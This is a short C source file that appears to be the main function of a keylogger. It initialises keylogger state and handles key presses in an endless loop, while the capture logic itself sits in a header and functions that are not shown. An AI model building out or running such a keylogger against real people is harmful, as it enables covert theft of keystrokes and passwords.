#include "keyloger.h"

int main(void)
{
	t_key keyData;
	
	initKeylogger(&keyData);
	while (1)
	{
	   handleKeyPress(&keyData);
	}
}
